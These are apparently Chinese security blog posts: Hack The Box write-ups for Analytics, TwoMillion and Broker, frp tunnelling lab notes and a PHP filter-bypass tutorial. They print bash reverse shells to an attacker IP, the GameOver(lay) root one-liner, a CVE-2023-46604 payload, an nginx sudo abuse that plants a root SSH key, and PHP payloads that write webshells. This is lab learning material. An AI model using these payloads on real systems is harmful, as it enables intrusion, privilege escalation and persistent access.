setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f[*] Sending exploit (may take a few seconds)[*] Command shell session 1 opened (10.10.16.5:4444 -&gt; 10.10.11.233:49520) at 2024-01-01 13:49:23 +0800 whoami metabase user-metalytics敏感信息藏得挺深的，居然在环境变量里面； 1234567891011121314151617181920212223242526272829env MB_LDAP_BIND_DN= LANGUAGE=en_US:en USER=metabase HOSTNAME=f119c1f252f8FC_LANG=en-USSHLVL=5LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libHOME=/home/metabaseMB_EMAIL_SMTP_PASSWORD=LC_CTYPE=en_US.UTF-8JAVA_VERSION=jdk-11.0.19+7LOGNAME=metabase_=/bin/shMB_DB_CONNECTION_URI=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_PASS=MB_JETTY_HOST=0.0.0.0META_PASS=An4lytics_ds20223#LANG=en_US.UTF-8MB_LDAP_PASSWORD=SHELL=/bin/shMB_EMAIL_SMTP_USERNAME=MB_DB_USER=META_USER=metalyticsLC_ALL=en_US.UTF-8JAVA_HOME=/opt/java/openjdkPWD=/MB_DB_FILE=//metabase.db/metabase.db 中发现 12META_USER=metalyticsMETA_PASS=An4lytics_ds20223# ssh登陆成功 12ssh metalytics@10.10.11.233 An4lytics_ds20223# user-rootsudo -l没有利用点123metalytics@analytics:~$ sudo -l[sudo] password for metalytics: Sorry, user metalytics may not run sudo on localhost. suid没有利用点123456789101112131415metalytics@analytics:~$ find / -perm -4000 2&gt;/dev/null/var/tmp/bash/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/su/usr/bin/umount/usr/bin/chsh/usr/bin/fusermount3/usr/bin/sudo/usr/bin/passwd/usr/bin/mount/usr/bin/chfn/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/libexec/polkit-agent-helper-1 uname -a1Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux 使用 CVE-2023-2640 和 CVE-2023-32629 获取非 Root 容器的 Root 权限，又名 GameOver(lay) payload只有一行 1unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn(&quot;/bin/bash&quot;)' Vulnerable kernels Kernel version Ubuntu release 6.2.0 Ubuntu 23.04 (Lunar Lobster) / Ubuntu 22.04 LTS (Jammy Jellyfish) 5.19.0 Ubuntu 22.10 (Kinetic Kudu) / Ubuntu 22.04 LTS (Jammy Jellyfish) 5.4.0 Ubuntu 22.04 LTS (Local Fossa) / Ubuntu 18.04 LTS (Bionic Beaver) 总结耐心，坚持，研究和技术技能的结合让我实现了目标。","link":"/2024/01/01/Analytics(HTB)/"},{"title":"frp+proxifier内网穿透","text":"frp内网穿透在长沙农大一次线下赛时，只给到了一台机器的ip；其他机器都是在内网之中，外网访问不到，需要通过给的一台机器来内网穿透到其他内网机器；当时打比赛也想到了这一点。可惜的是，我刚准备上传frp工具时，才发现我只下载了windows版本；当时疏忽大意，没有准备frp的linux版本；(当然内网穿透的工具还有很多)；现在想想还挺可惜的；趁着寒假没事做，重新复现一下frp如何内网穿透； 实验环境：​ windows11;kali;docker; 实验内容：​ 在kali上使用docker开启两个容器，一个容器A通过端口转发使得window可以通过kali的ip加转发的端口访问，另一个容器B不做任何转发， 实验目的：​ 使得windows通过容器A使用frp工具内网穿透到可以访问容器B; 我比较懒，两个容器用的是同一个镜像；frp_one则是容器A的作用，实现端口转发;frp_two则是容器B的作用; 通过kali的ip加转发的端口访问，内容就是一句话木马(还是之前实验室内部考核赛的镜像)，容器内容无所谓的，只要方便连蚁剑就行； 直接用蚁剑连接 当不知道内网其他机器的ip时，可以先通过自己手动内网搜集，来确定其他ip地址，比如/proc/net/arp(当与其他机器通信时，arp协议会记录对方的ip和mac地址)； 1234www-data:/var/www/html) $ cat /proc/net/arpIP address HW type Flags HW address Mask Device172.17.0.1 0x1 0x2 02:42:91:ca:3b:2a * eth0172.17.0.3 0x1 0x2 02:42:ac:11:00:03 * eth0 当然也可以借用fscan等工具；利用蚁剑上传； 1./fscan_amd64 -h 172.17.0.1/24 123456172.17.0.2:80 open172.17.0.3:80 open172.17.0.1:8080 open[*] WebTitle: http://172.17.0.2 code:200 len:758 title:None[*] WebTitle: http://172.17.0.3 code:200 len:758 title:None[*] WebTitle: http://172.17.0.1:8080 code:200 len:758 title:None 通过以上介绍的两种方法可以确定内网中还存在一个ip172.17.0.3并且这个ip开放着80端口； 我们尝试通过frp工具来内网穿透，以致于可以访问172.17.0.3:80; 上传frp成功后；修改frpc.ini配置如下；server_addr根据情况而定，我这里是因为我的攻击机windows的地址是192.168.0.55;因为当时比赛不可以联网，只能将宿主机，也就是windows当作代理服务器，如果可以联网，将自己的vps当作代理服务器即可 12345678[common]server_addr = 192.168.0.55server_port = 7000[socks5]type = tcpplugin = socks5 remote_port = 5000 修改成功后，给frpc加可执行权限 1chmod +x ./frpc 并执行 1./frpc -c frpc.ini 然后再攻击机windows上执行 1frps -c frps.ini 可以看到success，代表成功了。让我们用浏览器访问一下； 当然浏览器还不可以直接访问，需要借助代理插件，firefox最常用的莫非就是FoxyProxy了，当然chrome浏览器也有对应的插件； 配置大概如下 接着浏览器输入，即可访问成功了，(我这里两个容器用的是一个镜像，内容是一样的)； 1http://172.17.0.3/ 到这里利用frp实现内网穿透的实验基本就做完了，当然，在实战中，情况是千变万化的；面对不同的情况需要做出相应的改变； 可以看到，内网穿透的实现基本是借用工具完成的；并没有让我们敲很多代码啥的； 这里接着介绍一款工具：proxifier 具体功能：允许用户无需对每个应用程序进行单独的配置，就能通过代理服务器或防火墙进行网络连接，因而受到广泛欢迎。 在一些情况下，我们可能需要借助python的脚本从而实现攻击；这种情况简直太常见了，我们怎么使python通过代理可以访问内网穿透的靶机了，这就需要借助proxifier工具 这样设置，所有应用都会走我们设置的代理，如果你希望一些应用不走代理，只需要对应设置一下代理规则即可， 1234567891011import requestsurl = &quot;http://172.17.0.3/&quot;response = requests.get(url=url)if (response.status_code == 200): print(&quot;success&quot;)else: print(&quot;fail&quot;)#success 开启proxifier；即使我的Chrome没有开启frp代理，依然可以访问; 注意：proxifier最好使用Standard版本；不要使用Portable版本；可能会有问题(一开始我用Portable版本，即使代理规则和代理服务器没有错误，python和其他应用程序始终访问不了172.17.0.3,直到换成Standard版本)； 到这里，frp+proxifier内网穿透的笔记已经记录完成，但是需要注意的是，我这个实验比较简单，在实战中，往往没有这么简单，需要冷静分析，从而到达效果。","link":"/2024/01/25/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"title":"TwoMillion(HTB)","text":"信息搜集nmap1234567891011121314151617181920212223242526272829303132333435┌──(kali㉿kali)-[~]└─$ sudo nmap -p- -min-rate 10000 10.10.11.221[sudo] kali 的密码：Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-26 16:03 CSTNmap scan report for 2million.htb (10.10.11.221)Host is up (0.078s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http ┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -sC -O -p80,22 10.10.11.221Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-26 16:03 CSTNmap scan report for 2million.htb (10.10.11.221)Host is up (0.13s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-trane-info: Problem with XML parsing of /evox/about|_http-title: Hack The Box :: Penetration Testing LabsWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 目录和子域名扫描无果 1sudo dirsearch -u http://2million.htb 从nmap扫描的信息得到主域名 1sudo echo &quot;10.10.11.221 2million.htb&quot; &gt;&gt; /etc/hosts www-data邀请码点击join会重定向到/invite 要求输入邀请码 注册功能也需要邀请码才能注册 F12在invite页面中会发现一个名为inviteapi.min.js的js文件，内容如下： 即使做了js混淆，也可以明显看到verifyInviteCode和makeInviteCode函数 1eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{})) 尝试在控制台中执行”inviteapi.min.js”文件中的makeInviteCode函数 1Object { data: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&quot;, enctype: &quot;ROT13&quot; } rot13在线解密得到 1In order to generate the invite code, make a POST request to /api/v1/invite/generate POST请求，在base64解密，成功得到邀请码 1234567┌──(kali㉿kali)-[~]└─$ curl -X POST http://2million.htb/api/v1/invite/generate{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;SUFGNE4tN1FHSVEtN0o3WUYtUThBVjA=&quot;,&quot;format&quot;:&quot;encoded&quot;}} (kali㉿kali)-[~]└─$ echo &quot;SUFGNE4tN1FHSVEtN0o3WUYtUThBVjA=&quot; | base64 -dIAF4N-7QGIQ-7J7YF-Q8AV0 在/invite输入邀请码会重定向到/register，并且邀请码填充到了里面； 随意注册一个账号，并登录 获得管理员权限/home/access点击”Connection Pack”抓包，发现一个下载ovpn文件的api； api漏洞常规测试： 123GET /api/v1/user/vpn HTTP/1.1GET /api/v1/user HTTP/1.1GET /api/v1 HTTP/1.1 发现/api/v1有内容；内容是所有的api接口以及接口的作用 12345678910111213141516171819202122232425262728293031{ &quot;v1&quot;:{ &quot;user&quot;:{ &quot;GET&quot;:{ &quot;\\/api\\/v1&quot;:&quot;Route List&quot;, &quot;\\/api\\/v1\\/invite\\/how\\/to\\/generate&quot;:&quot;Instructions on invite code generation&quot;, &quot;\\/api\\/v1\\/invite\\/generate&quot;:&quot;Generate invite code&quot;, &quot;\\/api\\/v1\\/invite\\/verify&quot;:&quot;Verify invite code&quot;, &quot;\\/api\\/v1\\/user\\/auth&quot;:&quot;Check if user is authenticated&quot;, &quot;\\/api\\/v1\\/user\\/vpn\\/generate&quot;:&quot;Generate a new VPN configuration&quot;, &quot;\\/api\\/v1\\/user\\/vpn\\/regenerate&quot;:&quot;Regenerate VPN configuration&quot;, &quot;\\/api\\/v1\\/user\\/vpn\\/download&quot;:&quot;Download OVPN file&quot; }, &quot;POST&quot;:{ &quot;\\/api\\/v1\\/user\\/register&quot;:&quot;Register a new user&quot;, &quot;\\/api\\/v1\\/user\\/login&quot;:&quot;Login with existing user&quot; } }, &quot;admin&quot;:{ &quot;GET&quot;:{ &quot;\\/api\\/v1\\/admin\\/auth&quot;:&quot;Check if user is admin&quot; }, &quot;POST&quot;:{ &quot;\\/api\\/v1\\/admin\\/vpn\\/generate&quot;:&quot;Generate VPN for specific user&quot; }, &quot;PUT&quot;:{ &quot;\\/api\\/v1\\/admin\\/settings\\/update&quot;:&quot;Update user settings&quot; } } }} 我们的账号只是普通用户； 返回401 Unauthorized,看来是没有权限 最终发现/api/v1/admin/vpn/generateAPI接口可以将用户帐户更改为管理员帐户 返回错误的数据类型 添加”Content-type: application/json”，返回缺少参数 “email” 添加一条”email”数据，返回缺少此参数“is_admin” 返回“is_admin”只能为0或1 最终成功修改为admin账号 命令注入/api/v1/admin/vpn/generat也是生成ovpn文件的接口；生成 VPN 密钥的可能不是 PHP 代码，而是一些生成 VPN 密钥必要信息的 Bash 工具。值得检查是否有任何命令注入。 如果服务器正在执行类似的操作gen_vpn.sh [username]，那么我将尝试;在用户名中放入username中以将其分解为新命令。我还将#在末尾添加一个以注释掉我输入后可能出现的任何内容；然后发现/api/v1/admin/vpn/generate接口存在命令注入 反弹一个shell到攻击机 1nc -lnvp 5555 POST请求数据如下 123{&quot;username&quot;:&quot;test; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.17/5555 0&gt;&amp;1';#&quot;} 成功反弹shell后,存在一个admin用户 12www-data@2million:~/html$ ls -l /homedrwxr-xr-x 6 admin admin 4096 Jan 26 07:50 admin 在web应用默认目录下的.env文件中发现用户admin的数据库密码， 123456w-data@2million:~/html$ cat .envcat .envDB_HOST=127.0.0.1DB_DATABASE=htb_prodDB_USERNAME=adminDB_PASSWORD=SuperDuperPass123 伪终端，连接数据库，在数据库中并没有找到可利用的信息， 1python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot; 尝试利用数据库密码连接admin的ssh 12ssh admin@10.10.11.221password:SuperDuperPass123 user_adminssh连接成功，但是在连接ssh的时候，有这样一些信息 12You have mail.Last login: Fri Jan 26 08:53:41 2024 from 10.10.14.6 利用find命令查找有关’mail’的文件 1234567admin@2million:~$ find / -name &quot;mail&quot; 2&gt;/dev/null/snap/core20/1891/var/mail/snap/core20/1891/var/spool/mail/var/spool/mail/var/mail/usr/lib/python3/dist-packages/twisted/mail/usr/lib/byobu/mail 根据每个目录的作用，基本可以确定在’/var’目录下 从中有一些关键词OverlayFS / FUSE说明这台机器的内核会受到影响 1234567891011121314admin@2million:~$ cat /var/mail/admin From: ch4p &lt;ch4p@2million.htb&gt;To: admin &lt;admin@2million.htb&gt;Cc: g0blin &lt;g0blin@2million.htb&gt;Subject: Urgent: Patch System OSDate: Tue, 1 June 2023 10:45:22 -0700Message-ID: &lt;9876543210@2million.htb&gt;X-Mailer: ThunderMail Pro 5.2Hey admin,I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.HTB Godfather user_root我只是把关键词放到google；后面一些内容已经暴露了 一些exploit 其中排在google第一个的就是cve-2023-0386,文章中表明：如果系统的内核版本低于 6.2，则该系统可能容易受到攻击。 1234567admin@2million:~$ uname -aLinux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxadmin@2million:~$ cat /etc/lsb-release DISTRIB_ID=UbuntuDISTRIB_RELEASE=22.04DISTRIB_CODENAME=jammyDISTRIB_DESCRIPTION=&quot;Ubuntu 22.04.2 LTS&quot; 在 GitHub 上提供了针对此漏洞的 POC。虽然内容README.md很少，但提供了足够的使用说明。 我使用git克隆到我本地，再用python服务将poc上传到目标机上 1python3 -m http.server 1wget -r http://10.10.16.17:8000/CVE-2023-0386 再跟着readme.md操作； 编译 1make all 使用 启动两个终端，在第一个终端中输入 1./fuse ./ovlcap/lower ./gc 在第二个终端输入 1./exp 成功提权为root","link":"/2024/01/26/TwoMillion(HTB)/"},{"title":"Broker(HTB)","text":"信息搜集nmap12345678910111213141516171819┌──(kali㉿kali)-[~]└─$ sudo nmap -p- -min-rate 10000 10.10.11.243 -oA test/nmap [sudo] kali 的密码：Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-27 12:12 CSTNmap scan report for 10.10.11.243 (10.10.11.243)Host is up (0.074s latency).Not shown: 65524 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http1337/tcp open waste1338/tcp open wmc-log-svc1883/tcp open mqtt5672/tcp open amqp8161/tcp open patrol-snmp44455/tcp open unknown61613/tcp open unknown61614/tcp open unknown61616/tcp open unknown 端口比较多，整理放到变量中，方便后续使用 123456┌──(kali㉿kali)-[~]└─$ ports=$(grep open test/nmap.nmap |awk -F '/' '{print $1}'|paste -sd ',') ┌──(kali㉿kali)-[~]└─$ echo $ports22,80,1337,1338,1883,5672,8161,44455,61613,61614,61616 进一步详细扫描 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687┌──(kali㉿kali)-[~]└─$sudo nmap -sT -sV -sC -O -p$ports 10.10.11.243 -oA test/detailsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Error 401 Unauthorized| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm1337/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: 403 Forbidden1338/tcp open http nginx 1.18.0 (Ubuntu)| http-ls: Volume /| maxfiles limit reached (10)| SIZE TIME FILENAME| - 06-Nov-2023 01:10 bin/| - 06-Nov-2023 01:10 bin/X11/| 963 17-Feb-2020 14:11 bin/NF| 129576 27-Oct-2023 11:38 bin/VGAuthService| 51632 07-Feb-2022 16:03 bin/%5B| 35344 19-Oct-2022 14:52 bin/aa-enabled| 35344 19-Oct-2022 14:52 bin/aa-exec| 31248 19-Oct-2022 14:52 bin/aa-features-abi| 14478 04-May-2023 11:14 bin/add-apt-repository| 14712 21-Feb-2022 01:49 bin/addpart|_|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Index of /1883/tcp open mqtt|_mqtt-subscribe: Failed to receive control packet from server.5672/tcp open amqp?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: | AMQP| AMQP| amqp:decode-error|_ 7Connection from client using unsupported AMQP attempted|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 658161/tcp open http Jetty 9.4.39.v20210325| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm|_http-server-header: Jetty(9.4.39.v20210325)|_http-title: Error 401 Unauthorized44455/tcp open tcpwrapped61613/tcp open stomp Apache ActiveMQ| fingerprint-strings: | HELP4STOMP: | ERROR| content-type:text/plain| message:Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)| org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)| org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)| org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)| org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)|_ java.lang.Thread.run(Thread.java:750)61614/tcp open http Jetty 9.4.39.v20210325|_http-server-header: Jetty(9.4.39.v20210325)|_http-title: Site doesn't have a title.| http-methods: |_ Potentially risky methods: TRACE61616/tcp open apachemq ActiveMQ OpenWire transport| fingerprint-strings: | NULL: | ActiveMQ| TcpNoDelayEnabled| SizePrefixDisabled| CacheSize| ProviderName | ActiveMQ| StackTraceEnabled| PlatformDetails | Java| CacheEnabled| TightEncodingEnabled| MaxFrameSize| MaxInactivityDuration| MaxInactivityDurationInitalDelay| ProviderVersion |_ 5.15.15 TCP-80需要认证 “admin”/“admin“弱密码。登陆 ActiveMQ 的管理界面： 其中显示了ActiveMQ的版本号值得我们留意:”5.15.15” user-activemq 在X1r0z大神的一篇博客表明：Apache ActiveMQ (版本 &lt; 5.18.3) RCE 分析 在github上可以找到一篇不错的poc:CVE-2023-46604 我将poc克隆到我本地；并且将poc.xml的ip以及端口更改为我的本地ip和后继要nc的端口 12345678910111213141516171819202122232425262728┌──(kali㉿kali)-[~/htb/machines/broker/CVE-2023-46604]└─$ ls -al 总计 24drwxr-xr-x 3 kali kali 4096 1月27日 11:51 .drwxr-xr-x 3 kali kali 4096 1月27日 11:49 ..-rw-r--r-- 1 kali kali 1828 1月27日 11:49 exploit.pydrwxr-xr-x 8 kali kali 4096 1月27日 11:49 .git-rw-r--r-- 1 kali kali 666 1月27日 11:51 poc.xml-rw-r--r-- 1 kali kali 2082 1月27日 11:49 README.md ┌──(kali㉿kali)-[~/htb/machines/broker/CVE-2023-46604]└─$ cat poc.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.17/5555 0&amp;gt;&amp;amp;1&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; 为了能使目标机可以访问到poc.xml，我在本地开启了nginx服务，并且监听80端口 启动nc 1nc -lnnp 5555 使用poc实施RCE 1python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.16.17/poc.xml 得到activemq用户的shell 12activemq@broker:/home$ iduid=1000(activemq) gid=1000(activemq) groups=1000(activemq) user-root常规权限检查 12345678910activemq@broker:/home$ sudo -lsudo -lMatching Defaults entries for activemq on broker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser activemq may run the following commands on broker: (ALL : ALL) NOPASSWD: /usr/sbin/nginx activemq用户可以以root权限使用nginx 我可以制作一个恶意的配置文件，user为root;并且使得网站目录为/；这样就可以访问任意文件了 1234567891011user root;events { worker_connections 1024;}http { server { listen 1337; root /; autoindex on; }} 再用nginx的-c参数指定配置文件 1sudo /usr/sbin/nginx -c /home/activemq/shell.config netstat -ltunp发现端口1337已经在监听状态 123┌──(kali㉿kali)-[/var/log/nginx]└─$ curl http://10.10.11.243:1337/root/root.txt5f68e0f2578b1608db7db4ffa55bba46 除了文件读取；nginx 还可以处理写入文件的 PUT 请求。我将更新配置以包括启用 PUT 123456789101112user root;events { worker_connections 1024;}http { server { listen 1338; root /; autoindex on; dav_methods PUT; }} 将我的公共 SSH 密钥写入 root 的authorized_keys文件中 1curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' 接着利用私钥 ssh连接即可","link":"/2024/01/27/Broker(HTB)/"},{"title":"无字母数字RCE","text":"取反(~)测试代码如下 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);$code = $_GET['code'];if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$code)){ die(&quot;hacker!&quot;);}eval($code);?&gt; 大概意思就是利用第一次取反绕过字母和数字，第二次取反，得到原来的数据； 12345678910111213141516&lt;?php#phpinfo();#(~%8F%97%8F%96%91%99%90)();echo urlencode(~&quot;phpinfo&quot;).&quot;\\n&quot;;#system(&quot;whoami&quot;);#(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);echo urlencode(~&quot;system&quot;).&quot;\\n&quot;;echo urlencode(~&quot;whoami&quot;).&quot;\\n&quot;;#file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php eval($_POST[1]);&quot;)#(~%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C)((~%8C%97%9A%93%93%D1%8F%97%8F),(~%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4%C0%C1));echo urlencode(~&quot;file_put_contents&quot;).&quot;\\n&quot;;echo urlencode(~&quot;shell.php&quot;).&quot;\\n&quot;;echo urlencode(~&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;).&quot;\\n&quot;; 注意:经过测试只有在7.*版本才可以这么用，5或8版本都不行，并且只有当请求方式为GET是才有用，$_POST没用 当我将上面的的请求方式从GET更改为POST,会发现POST的数据再第二次取反之后会在每一个字符之间加一个=符号； 异或(^)测试代码依旧是 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);$code = $_GET['code'];if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$code)){ die(&quot;hacker!&quot;);}eval($code);?&gt; 异或可以借助python脚本 1234567891011121314151617181920212223import urllib.parsedef url_encode(url): return urllib.parse.quote(url)valid = &quot;!@$%#^*(){}[];\\'\\&quot;,.&lt;&gt;/?-=_`~ &quot;answer = str(input(&quot;Please input: &quot;))tmp1, tmp2 = '', ''for c in answer: for i in valid: for j in valid: if (ord(i) ^ ord(j) == ord(c)): tmp1 += i tmp2 += j break else: continue breakprint(&quot;tmp1:&quot;,tmp1)print(&quot;tmp2:&quot;,tmp2)print('&quot;'+url_encode(tmp1)+'&quot;^&quot;'+url_encode(tmp2)+'&quot;') payload 123456789phpinfo()#(&quot;%5E%40%5E%40%40%5B%40&quot;^&quot;.%28.%29.%3D/&quot;)();system(&quot;ls&quot;);#(&quot;%5E%24%5E%5E%40%40&quot;^&quot;-%5D-%2A%25-&quot;)(&quot;%40%5E&quot;^&quot;%2C-&quot;);file_put_contents(&quot;a.php&quot;,&quot;&lt;?php eval($_POST[a]);&quot;)#(&quot;%5B%40%40%40%21%5E%2A%5E%21%40%40%40%5E%40%40%5E%5E&quot;^&quot;%3D%29%2C%25~._%2A~%23/.%2A%25.%2A-&quot;)(((&quot;%21&quot;^&quot;%40&quot;).&quot;.&quot;.(&quot;%5E%40%5E&quot;^&quot;.%28.&quot;)),(&quot;&lt;&quot;.(&quot;_%5E%40%5E%40%40%5E%21%40&quot;^&quot;%60.%28.%60%25%28%40%2C&quot;).&quot;(&quot;.(&quot;%7B%21%7D/%28%2A%25%21%23&quot;^&quot;_~-%60%7B~~%40~&quot;).')'.(&quot;%40&quot;^&quot;%7B&quot;))); 如果可以异或的字符很少，可能有一些字符异或不出来(一般都是一些特殊字符)；遇到这种情况如果waf没有过滤那个异或不出来的字符，可以直接用.点号拼接；当然，是在点好号没有被过滤的提前下； 注意：经过测试异或在5的版本不行，可以在7.*或者8.*的版本，并且POST和GET请求方式都可以； 自增(=,+)测试代码依旧是 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);$code = $_GET['code'];if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$code)){ die(&quot;hacker!&quot;);}eval($code);?&gt; 当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符 123456789&lt;?php$_=[];var_dump($_);print(&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;).&quot;\\n&quot;;$_=[].'';var_dump($_);print(&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;).&quot;\\n&quot;;$_=[].'';echo $_[0]; 构造出$_GET[_]($_GET[__]) 12345678910111213141516171819202122232425262728293031&lt;?php$_=[];$_=&quot;$_&quot;; //Array$_=$_['!'=='@']; //[0] 就是取字符A$_++;$_++;$_++;$_++;$__=$_++; //E$_++;$___=$_++; //G$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$____=$_++; //Tprint($__).&quot;\\n&quot;;print($___).&quot;\\n&quot;;print($____).&quot;\\n&quot;;$_='_'.$___.$__.$____;print($_).&quot;\\n&quot;;//$$_[_]($$_[__]); //$_GET[_]($_GET[__]);?&gt; 将上面的代码合成一行；如下： 1$_=[];$_=&quot;$_&quot;;$_=$_['!'=='@'];$_++;$_++;$_++;$_++;$__=$_++;$_++;$___=$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$____=$_++;$_='_'.$___.$__.$____;$$_[_]($$_[__]); 但是$_GET[_]($_GET[__]);似乎只在7.*版本管用； 本来想构造eval来着的，好像不太行；构造system($_GET[_]);， 